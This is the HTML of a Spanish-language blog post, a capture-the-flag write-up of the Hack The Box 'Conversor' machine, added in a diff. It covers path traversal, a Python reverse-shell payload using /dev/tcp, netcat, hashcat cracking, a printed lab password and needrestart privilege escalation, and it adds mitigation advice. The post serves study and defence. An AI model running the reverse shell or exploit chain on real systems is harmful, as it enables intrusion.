@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="es" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>WriteUp: Conversor | HTB | MaxisFront</title><meta name="description" content="HTB Conversor Machine | Desafío creado por: FisMatHack"><meta property="og:title" content="WriteUp: Conversor | HTB"><meta property="og:description" content="HTB Conversor Machine | Desafío creado por: FisMatHack"><meta property="og:type" content="article"><meta property="og:url" content="https://maxisfront.me/es/posts/writeup-conversor-htb/"><meta property="og:image" content="https://maxisfront.me/posts/writeup-conversor-htb/Conversor_Shield.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630"><meta property="og:site_name" content="MaxisFront"><meta property="og:locale" content="es">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="WriteUp: Conversor | HTB">
+<meta name="twitter:description" content="HTB Conversor Machine | Desafío creado por: FisMatHack"><meta name="twitter:image" content="https://maxisfront.me/posts/writeup-conversor-htb/Conversor_Shield.png">
+<link rel="canonical" href="https://maxisfront.me/es/posts/writeup-conversor-htb/">
+
+<link rel="alternate" hreflang="en" href="https://maxisfront.me/posts/writeup-conversor-htb/"><link rel="stylesheet" href="/css/primer.min.c12daf26af408c64f29cc993dd5ab422334e71e50fa7198111b729fdf674e34d.css" integrity="sha256-wS2vJq9AjGTynMmT3Vq0IjNOceUPpxmBEbcp/fZ0400=">
+
+<link rel="stylesheet" href="/css/custom.min.44f76475abc99bc3028656bd061d05d398c1b30eefd8ef829d03d0a85e7e5ff2.css" integrity="sha256-RPdkdavJm8MChla9Bh0F05jBsw7v2O&#43;CnQPQqF5&#43;X/I=">
+
+<link rel="stylesheet" href="/css/syntax.min.174c84898cba6753b1e76756faaba89295a9b36f5a52958e027f347103d8575d.css" integrity="sha256-F0yEiYy6Z1Ox52dW&#43;quokpWps29aUpWOAn80cQPYV10=">
+
+
+<link rel="stylesheet" href="/css/custom_properties.min.976236aa37c1f366275e6eba511733b6b95845d8d5f5516fb394a5be37e10ace.css" integrity="sha256-l2I2qjfB82YnXm66URcztrlYRdjV9VFvs5SlvjfhCs4=">
+
+
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-EY36TLSMFS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-EY36TLSMFS');
+</script>
+<script>
+  (function() {
+    const saved = localStorage.getItem('theme');
+    const html = document.documentElement;
+    if (saved === 'light' || saved === 'dark') {
+      html.setAttribute('data-color-mode', saved);
+    }
+  })();
+</script>
+</head>
+<body>
+  <div class="d-flex flex-column min-height-full"><header class="AppHeader">
+  <div class="AppHeader-globalBar">
+    <div class="AppHeader-globalBar-start">
+      <a href="/es/" class="AppHeader-logo" aria-label="MaxisFront"><span class="AppHeader-logo-text">MaxisFront</span></a>
+
+      <nav class="AppHeader-nav" aria-label="Main navigation"><a href="/es/" class="AppHeader-nav-item">Home</a><a href="/es/posts/" class="AppHeader-nav-item">Posts</a></nav>
+    </div>
+
+    <div class="AppHeader-globalBar-end"><button type="button" id="theme-toggle"
+  class="tooltipped tooltipped-s"
+  aria-label="System theme"
+  data-tooltip-light="Light theme"
+  data-tooltip-dark="Dark theme"
+  data-tooltip-auto="System theme">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-light" style="display: none;">
+    <path d="M8 12a4 4 0 1 1 0-8 4 4 0 0 1 0 8Zm0-1.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Zm5.657-8.157a.75.75 0 0 1 0 1.061l-1.061 1.06a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734l1.06-1.06a.75.75 0 0 1 1.06 0Zm-9.193 9.193a.75.75 0 0 1 0 1.06l-1.06 1.061a.75.75 0 1 1-1.061-1.06l1.06-1.061a.75.75 0 0 1 1.061 0ZM8 0a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-1.5 0V.75A.75.75 0 0 1 8 0ZM3 8a.75.75 0 0 1-.75.75H.75a.75.75 0 0 1 0-1.5h1.5A.75.75 0 0 1 3 8Zm13 0a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1 0-1.5h1.5A.75.75 0 0 1 16 8Zm-8 5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-1.5 0v-1.5A.75.75 0 0 1 8 13Zm3.536-1.464a.75.75 0 0 1 1.06 0l1.061 1.06a.75.75 0 0 1-1.06 1.061l-1.061-1.06a.75.75 0 0 1 0-1.061Zm-9.193-9.193a.75.75 0 0 1 1.06 0l1.061 1.06a.75.75 0 0 1-1.06 1.061L2.343 3.403a.75.75 0 0 1 0-1.06Z"></path>
+  </svg>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-dark" style="display: none;">
+    <path d="M9.598 1.591a.749.749 0 0 1 .785-.175 7.001 7.001 0 1 1-8.967 8.967.75.75 0 0 1 .961-.96 5.5 5.5 0 0 0 7.046-7.046.75.75 0 0 1 .175-.786Zm1.616 1.945a7 7 0 0 1-7.678 7.678 5.499 5.499 0 1 0 7.678-7.678Z"></path>
+  </svg>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-auto" style="display: none;">
+    <path d="M14.25 1c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.752.752 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.193-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5C0 1.784.784 1 1.75 1ZM1.75 2.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25ZM9.018 13H6.982a5.72 5.72 0 0 1-.765 1.5h3.566a5.72 5.72 0 0 1-.765-1.5Z"></path>
+  </svg>
+</button>
+<details class="dropdown details-reset details-overlay AppHeader-dropdown">
+        <summary class="AppHeader-button" aria-haspopup="true" aria-label="Select language">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor">
+            <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM5.78 8.75a9.64 9.64 0 0 0 1.363 4.177c.255.426.542.832.857 1.215.245-.296.551-.705.857-1.215A9.64 9.64 0 0 0 10.22 8.75Zm4.44-1.5a9.64 9.64 0 0 0-1.363-4.177c-.307-.51-.612-.919-.857-1.215a9.927 9.927 0 0 0-.857 1.215A9.64 9.64 0 0 0 5.78 7.25Zm-5.944 1.5H1.543a6.507 6.507 0 0 0 4.666 5.5c-.123-.181-.24-.365-.352-.552-.715-1.192-1.437-2.874-1.581-4.948Zm-2.733-1.5h2.733c.144-2.074.866-3.756 1.58-4.948.12-.197.237-.381.353-.552a6.507 6.507 0 0 0-4.666 5.5Zm10.181 1.5c-.144 2.074-.866 3.756-1.581 4.948-.111.187-.229.371-.352.552a6.507 6.507 0 0 0 4.666-5.5Zm2.733-1.5a6.507 6.507 0 0 0-4.666-5.5c.123.181.241.365.352.552.715 1.192 1.437 2.874 1.581 4.948Z"></path>
+          </svg>
+          <span class="AppHeader-button-text">Español</span>
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" class="AppHeader-dropdown-caret">
+            <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
+          </svg>
+        </summary>
+        <ul class="dropdown-menu dropdown-menu-sw"><li>
+            <a href="/es/posts/writeup-conversor-htb/" class="dropdown-item selected" lang="es">Español</a>
+          </li><li>
+            <a href="/posts/writeup-conversor-htb/" class="dropdown-item" lang="en">English</a>
+          </li></ul>
+      </details></div>
+  </div>
+</header>
+<main class="flex-auto">
+      <div class="container-xl px-3 px-md-4 px-lg-5 py-4"><div class="Layout Layout--sidebarPosition-end Layout--flowRow-until-md">
+          <div class="Layout-main"><article>
+  <header class="mb-4">
+    <h1 class="f1 lh-condensed mb-2">WriteUp: Conversor | HTB</h1><div class="d-flex flex-items-center color-fg-muted f5 mb-3"><time datetime="2026-05-24T00:00:00Z">
+        2026-05-24
+      </time><span class="mx-2">&middot;</span><span>8 min read</span><span class="mx-2">&middot;</span><span>MaxisFront</span></div><div class="d-flex flex-wrap mb-3" style="gap: 0.5rem;"><a href="/es/tags/linux/" class="topic-tag">Linux</a><a href="/es/tags/web/" class="topic-tag">Web</a><a href="/es/tags/caido/" class="topic-tag">Caido</a><a href="/es/tags/path-traversal/" class="topic-tag">Path-traversal</a><a href="/es/tags/gtfobins/" class="topic-tag">GTFObins</a><a href="/es/tags/suid/" class="topic-tag">SUID</a><a href="/es/tags/cve-2024-48990/" class="topic-tag">CVE-2024-48990</a></div><img src="/posts/writeup-conversor-htb/Conversor_Shield.png" alt="WriteUp: Conversor | HTB" loading="lazy" class="rounded-2 width-full mb-3" style="max-height: 400px; object-fit: cover;"></header>
+
+  <div class="markdown-body">
+    <blockquote>
+<p>Todos los derechos reservados a la <strong>Hack The Box LTD</strong>.</p>
+</blockquote>
+
+
+
+
+  
+
+
+<div class="flash mb-3">
+  <blockquote>
+<p>Resumen</p>
+</blockquote>
+<ul>
+<li>Explotación de <code>Path Traversal</code> para obtener capacidad de <code>RCE</code></li>
+<li>Extracción y crackeo de hashes <code>MD5</code> mediante <code>Hashcat</code></li>
+<li>Reutilización de credenciales para el acceso por <code>SSH</code></li>
+<li>Aprovechamiento de SUID del comando <code>needrestart</code> (<code>CVE-2024-48990</code>)</li>
+<li>Recomendaciones de seguridad para prevenir y mitigar las vulnerabilidades de esta máquina.</li>
+</ul>
+</div>
+
+
+
+<h4 id="habilidades-empleadas">Habilidades Empleadas</h4>
+<ul>
+<li>Enumeración de puertos</li>
+<li>Uso de comandos básicos basados en GNU/Linux</li>
+<li>Explotación por medio de  UFU y RCE</li>
+<li>Búsqueda y uso de CVE Crítico</li>
+<li>Aprovechamiento de SUID vulnerable</li>
+</ul>
+<h4 id="herramientas-utilizadas">Herramientas Utilizadas</h4>
+<ul>
+<li>Nmap</li>
+<li>Caido</li>
+<li>Netcat</li>
+<li>Strings</li>
+<li>Hashcat</li>
+<li>SSH</li>
+<li>sudo</li>
+<li>needrestart</li>
+</ul>
+<hr>
+<h2 id="escaneo-y-análisis-de-vulnerabilidades">Escaneo y Análisis de Vulnerabilidades</h2>
+<p>La plataforma <code>HTB</code> nos provee la <code>IP</code> objetivo, la cual es la <code>10.129.12.212</code>, dirección capaz de ser alcanzada conectándonos a través de la <code>VPN</code> que nos asigna la plataforma.</p>
+<h3 id="reconocimiento-de-puertos">Reconocimiento de Puertos</h3>
+<p>Realizamos una enumeración  de los 65535 puertos <code>TCP</code> del sistema a través de la herramienta <code>Nmap</code>, enfocándonos en los de estado abierto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#bd93f9">5000</span> -Pn -n -oN nmap-scan 10.129.12.212</span></span></code></pre></div><img src="/posts/writeup-conversor-htb/images/1_Conversor-nmap-scan.png" alt="Arp-Scan output" loading="lazy">
+<blockquote>
+<p>&lt;= Importante =&gt;
+En entornos empresariales, enviar grandes cantidades de paquetes <code>TCP</code>, <code>ICMP</code> o <code>UDP</code> suele provocar un congestionamiento  de la red, provocando un ataque <code>DoS</code> accidental o ser bloqueados por sistemas de monitorización.</p>
+</blockquote>
+<h3 id="enumeración-de-puertos">Enumeración de Puertos</h3>
+<p>Observamos que los puertos 22 <code>(SSH)</code> y 80 <code>(HTTP)</code> se encuentran activos. A partir e este punto podemos enumerar los servicios a través de <code>Nmap</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p22,80 -oN ports-enumeration 10.129.12.212</span></span></code></pre></div><img src="/posts/writeup-conversor-htb/images/2_Conversor-ports-enumeration.png" alt="Enumerating ports through Nmap" loading="lazy">
+<p>Tras un análisis de la enumeración de puertos, podemos agrupar los resultados en la siguiente tabla:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">Puerto</th>
+          <th style="text-align: center">Servicio</th>
+          <th style="text-align: center">Versión</th>
+          <th style="text-align: center">Notas</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">22</td>
+          <td style="text-align: center">ssh</td>
+          <td style="text-align: center">OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</td>
+          <td style="text-align: center">Versión desactualizada propensa al <strong>CVE-2016-6210</strong> y al <strong>CVE-2015-5600</strong>, aunque para esta máquina <em>hay otra aproximación la objetivo</em></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">80</td>
+          <td style="text-align: center">http</td>
+          <td style="text-align: center">Apache httpd 2.4.52</td>
+          <td style="text-align: center">El objetivo posiblemente está corriendo un servicio <code>Apache</code> desactualizado para un servidor web</td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p>Herramientas como <code>whatweb</code> (Comando) o <code>Wappalyzer</code> (Extensión del navegador) son de gran utilidad cuando deseamos conocer únicamente las tecnologías que hay en un servicio http.</p>
+</blockquote>
+<p>A partir de la tabla podemos definir posibles vectores de aproximación al objetivo:</p>
+<blockquote>
+<ul>
+<li>
+<p>Puerto 22 (SSH): ervicio <code>OpenSSH</code> desactualizado, siendo usado posiblemente por un <code>Ubuntu 22.04 LTS</code> (Jammy Jellyfish). Posible enumeración de usuarios a través del <code>CVE-2016-6210</code> y ataque de tipo <code>DoS</code> (<code>CVE-2015-5600</code>). A simple vista no son vías potenciales de acceso directo al equipo.</p>
+</li>
+<li>
+<p>Puerto 80 (HTTP): Página web de código abierto hosteada por medio de un servicio <code>Apache httpd 2.4.52</code> desactualizado. Por medio de una enumeración web es posible encontrar otras vulnerabilidades.</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="enumeración-web">Enumeración Web</h3>
+<p>Previo a acceder a la web del objetivo <code>Conversor</code>, se realiza un <code>mapping</code> de la IP objetivo a la página de manera temporal. Esto es posible modificando el archivo <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>sudoedit /etc/hosts</span></span></code></pre></div><img src="/posts/writeup-conversor-htb/images/3_Conversor-map-IP-into-etc-hosts.png" alt="Map IP of Conversor into the /etc/hosts files" loading="lazy">
+<p>Tras acceder a la página es posible encontrar un panel de sesión. Para acceder creamos un usuario y contraseña.</p>
+<p>La página con la dirección <code>index.html</code> es una sección donde se permiten subir archivos con extensión <code>.xml</code> y <code>.xslt</code>, lo cual por si solo se considera un vector de ataque si existe una mala implementación (<code>CWE-91</code> y/o <code>CWE-611</code>).</p>
+<img src="/posts/writeup-conversor-htb/images/4_Conversor-submit-xml-xslt-files.png" alt="Submit XML and XSLT files section" loading="lazy">
+<blockquote>
+<p>Es de destacar que permitir a los usuarios subir archivos <code>.XSLT</code> es considerado una posible brecha de seguridad grave, pues un atacante puede insertar código malicioso e insertar referencias a entidades externas a la página (Hágase especial énfasis en las vulnerabilidades <code>XXE</code>).</p>
+</blockquote>
+<p>Si nos dirigidos a la dirección <code>/about</code> observamos que es posible descargar el código fuente de la página:</p>
+<img src="/posts/writeup-conversor-htb/images/5_Conversor-download-sourcecode.png" alt="About page with a &ldquo;Download Source Code&rdquo; button" loading="lazy">
+<blockquote>
+<p>Esto nos permite analizar la arquitectura de la página web para buscar fallas de seguridad (Como lo sería identificar una falta de sanitización de los archivos subidos por el usuario).</p>
+</blockquote>
+<p>Tras haber descargado y analizado los archivos <code>app.py</code> e <code>install.md</code> podemos destacar 2 fallas críticas de seguridad:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center"><code>Unrestricted File Upload</code> (app.py)</th>
+          <th style="text-align: center"><code>Cronjob</code> (install.md)</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">No se realizan validaciones ni sanitizaciones a los nombres de los archivos subidos, permitiendo una manipulación de rutas (Técnica conocida como <code>Path Traversal</code>)</td>
+          <td style="text-align: center">Cronjob encargado de ejecutar <em>todos</em> los códigos <code>python</code> en el directorio <code>/scripts</code> cada minuto</td>
+      </tr>
+  </tbody>
+</table>
+<img src="/posts/writeup-conversor-htb/images/6_Conversor-path-traversal-and-cronjob-identification.png" alt="Content of app.py and install.md with the relevant information" loading="lazy">
+<p>Estas 2 vulnerabilidades podrían permitir una un <code>RCE</code> si un atacante fuese capaz de subir un archivo a la dirección <code>/scripts</code>.</p>
+<p>Como primer paso, intentamos comprobar si es posible realizar un <code>Path Traversal</code> a través de peticiones <code>POST</code> modificando el parámetro <code>filename</code>; para ello, subimos un archivo vacío para intentar modificar una imagen en la dirección <code>conversor.htb/about</code>.</p>
+<p>Utilizando la herramienta <code>Caido</code>, interceptamos la petición y la manipulamos:</p>
+<img src="/posts/writeup-conversor-htb/images/7_Conversor-replace-arturo-image.png" alt="Testing the Path Traversal through the &ldquo;Caido&rdquo; tool" loading="lazy">
+<blockquote>
+<p>Modificamos el nombre del archivo, de tal manera que pueda desplazarse entre directorios hasta llegar a la sección <code>/about</code> y reemplazar la imagen <code>arturo.png</code>.</p>
+</blockquote>
+<p>Tras enviar la petición, observamos que fue posible modificar una imagen en la sección <code>/about</code>:</p>
+<img src="/posts/writeup-conversor-htb/images/8_Conversor-modify-arturo.png-image.png" alt="Image modified through a Path Traversal vulnerability" loading="lazy">
+<h2 id="explotación">Explotación</h2>
+<p>A partir de este punto nos enfocamos en intentar acceder a través de diversos métodos al sistema del equipo <code>Conversor</code>.</p>
+<h3 id="web">Web</h3>
+<p>Tras comprobar la existencia de un vector de ataque prometedor, subimos una <code>revershell</code> escrita en Python, modificando la ruta para que nuestro código malicioso sea almacenado en el directorio <code>/scripts</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&#39;&#34;</span>)</span></span></code></pre></div><img src="/posts/writeup-conversor-htb/images/9_Conversor-revershell-path-traversal.png" alt="Uploading a revershell to the /scritps directory" loading="lazy">
+<p>Utilizamos la herramienta <code>netcat</code> para entrar en modo escucha en el puerto <code>4444</code>. Tras esperar unos segundos, se entabla una conexión con el servidor víctima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span></span></span></code></pre></div><img src="/posts/writeup-conversor-htb/images/10_Conversor-connection-established-with-conversor.png" alt="Establishing connection through netcat" loading="lazy">
+<p>Tras obtener acceso, es posible encontrar la base de datos del servidor en la dirección <code>/var/www/conversor.htb/instance/users.db</code>. Esta posee la clave de acceso para el usuario <code>fismathack</code>, <em>hasheada</em> a través del algoritmo <code>MD5</code> (A día de hoy vulnerable).</p>
+<img src="/posts/writeup-conversor-htb/images/11_Conversor-identifying-user-and-hashed-password.png" alt="User and password inside the &ldquo;users.db&rdquo; file" loading="lazy">
+<p>Por medio de <code>hashacat</code> podemos <em>crackear</em> el hash a través de un <code>Dictionary Attack</code> de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#bd93f9">0</span> -a <span style="color:#bd93f9">0</span> hash-fismathack.txt wordlist.txt</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>-m</code>: especifica el tipo de algoritmo utilizado (En este cas, MD5)</li>
+<li><code>-a</code>: específica el método de ataque (En este caso, ataque por diccionario)</li>
+</ul>
+</blockquote>
+<h3 id="ssh">SSH</h3>
+<p><code>hashcat</code> nos devuelve la contraseña del usuario, que es <code>Keepmesafeandwarm</code>. Tras ello, podemos intentar comprobar si existe una reutilización de credenciales a través del servicio <code>SSH</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>ssh fismathack@conversor.htb <span style="color:#6272a4">#Keepmesafeandwarm</span></span></span></code></pre></div><img src="/posts/writeup-conversor-htb/images/12_Conversor-access-via-ssh-with-fismathack-user.png" alt="Access via SSH with the user fismathack" loading="lazy">
+<p>Tras acceder como el usuario <code>fismathack</code>, comprobamos si tenemos capacidad de ejecutar binarios con permiso <code>SUID</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>sudo -l</span></span></code></pre></div><img src="/posts/writeup-conversor-htb/images/13_Conversor-binaries-with-sudo-permissions.png" alt="binary with SUID permission" loading="lazy">
+<h3 id="cve-2024-48990">CVE-2024-48990</h3>
+<p>Observamos que el usuario <code>fismathack</code> puede ejecutar <code>needrestart</code> como administrador; una búsqueda rápida a través e la página <code>GTFObins</code> indica que este binario puede ejecutar código <code>perl</code> malicioso almacenado en un archivo con la extensión <code>.conf</code>.</p>
+<img src="/posts/writeup-conversor-htb/images/14_Conversor-gftobins-needrestart.png" alt="Indications to abuse the binary needrestart, from &ldquo;GTFObins&rdquo;" loading="lazy">
+<p>Creamos un archivo de configuración (Por ejemplo, <code>test.conf</code>). De esta manera, al pedirle a <code>needrestart</code> que cargue un archivo de <em>configuración adicional</em>, ejecute una <code>shell</code> heredada con permisos del usuario <code>root</code>.</p>
+<img src="/posts/writeup-conversor-htb/images/15_Conversor-privilege-escalation-with-needrestart-binary.png" alt="Privilege Escalation through the needrestart binary" loading="lazy">
+<p>Ahora tenemos una sesión de <code>bash</code> como el usuario <code>root</code>, tomando control total del sistema <code>Conversor</code>.</p>
+<h2 id="impacto">Impacto</h2>
+<p>Un atacante con permisos de un usuario común como <code>www-data</code> o <code>fismathack</code> tiene capacidades de:</p>
+<blockquote>
+<ul>
+<li>Capacidad de lectura de archivos de la aplicación web en el directorio <code>/var/www/conversor.htb</code>.</li>
+<li>Acceso a la base de datos <code>users.db</code>, exponiendo credenciales de usuario.</li>
+<li>Capacidad de ejecutar <code>scripts</code> y establecer sesiones persistentes.</li>
+<li>Capacidad de enumerar otros sistemas de la red y de realizar movimiento lateral.</li>
+</ul>
+</blockquote>
+<p>El atacante con permisos de administrador obtiene las capacidades de:</p>
+<blockquote>
+<ul>
+<li>Entablar persistencia entre sesiones y controlar el tráfico del servidor.</li>
+<li>Manipulación de <code>cronjobs</code> para ejecución de tareas maliciosas.</li>
+<li>Instalación de <code>backdoors</code> a nivel de kernel.</li>
+</ul>
+</blockquote>
+<h1 id="resumen">Resumen</h1>
+<p>La máquina <code>Conversor</code> presentó una serie de vulnerabilidades críticas (<strong>No todas expuestas en este WriteUp</strong>) tales como realizar un <code>Path Traversal</code> y posteriormente un <code>RCE</code>, así como que se presentó un <code>Credential Reuse</code> y explotación de un <code>SUID</code>, entre otras más. Por ello,  continuación se expondrán los descubrimientos, su gravedad y pautas para evitar esta clase de fallas de seguridad.</p>
+<h3 id="descubrimientos">Descubrimientos</h3>
+<blockquote>
+<p>Carga de archivos sin restricciones y <code>Path Traversal</code></p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerabilidad</strong></th>
+          <th style="text-align: center"><strong>Gravedad</strong></th>
+          <th style="text-align: center">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF1</td>
+          <td style="text-align: center">CWE-35 y CWE-434: Path Traversal y Subida de Archivos Sin Restricciones</td>
+          <td style="text-align: center"><span style="background-color: #cc0000; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Crítica 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">Falta de sanitización en el parámetro <code>filename</code> en el código <code>app.py</code>, permitiendo sobrescritura de archivos y alojamiento de código malicioso en rutas arbitrarias</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Medidas inmediatas</p>
+<blockquote>
+<ul>
+<li>Implementar funciones que eliminen caracteres que permitan saltos de directorio (<code>../</code>) en el nombre del archivo subido.</li>
+<li>Implementar un entorno aislado dentro de un contenedor  o entorno <em>sandbox</em>.</li>
+<li>Validar estrictamente las extensiones, contenido (<code>Magic Bytes</code>) y estructura de los archivos subidos (<code>.xml</code> y <code>.xslt</code>).</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+<blockquote>
+<p>Explotación de <code>XXE</code> en archivos <code>.xslt</code></p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerabilidad</strong></th>
+          <th style="text-align: center"><strong>Gravedad</strong></th>
+          <th style="text-align: center">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF2</td>
+          <td style="text-align: center">CWE-611: Restricción Incorrecta de las Referencias a Entidades Externas XML</td>
+          <td style="text-align: center"><span style="background-color: #cc0000; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Crítica 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">Procesamiento inseguro de archivos <code>.xslt</code>, permitiendo lectura y escritura de archivos del sistema, así como ejecución de comandos en el servidor</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Medidas inmediatas:</p>
+<blockquote>
+<ul>
+<li>Aplicar un <code>parser</code> seguro al procesar archivos <code>.xslt</code>, utilizando medidas como <code>resolve_entities=False</code>, <code>no_network=True</code>.</li>
+<li>Establecer un perfil de seguridad estricto, deshabilitando capacidades de lectura de archivos, de escritura y ejecución de comandos dentro del sistema y la red.</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+<blockquote>
+<p><code>Dictionary Attack</code> contra algoritmo <code>MD5</code></p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerabilidad</strong></th>
+          <th style="text-align: center"><strong>Gravedad</strong></th>
+          <th style="text-align: center">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF3</td>
+          <td style="text-align: center">CWE-328 y CWE-522: Uso de Hash Débil y Protección de Credenciales Insuficiente</td>
+          <td style="text-align: center"><span style="background-color: #ff4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Alta 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">Credenciales expuestas en  <code>users.db</code> y contraseñas con un <code>hash</code> débil (<code>MD5</code>)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">`</td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Medidas inmediatas:</p>
+<blockquote>
+<ul>
+<li>Utilizar funciones criptográficas de <code>hash</code> modernas y robustas (Como <code>Argon2id</code> o <code>SHA-512</code>).</li>
+<li>Utilizar mecanismos de <code>salting</code> único y aleatorio por cada contraseña nueva generada por el usuario.</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+<blockquote>
+<p>Aprovechamiento de <code>SUID</code> en el comando <code>needrestart</code></p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerabilidad</strong></th>
+          <th style="text-align: center"><strong>Gravedad</strong></th>
+          <th style="text-align: center">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF4</td>
+          <td style="text-align: center">CWE-269: Gestión inadecuada de Privilegios</td>
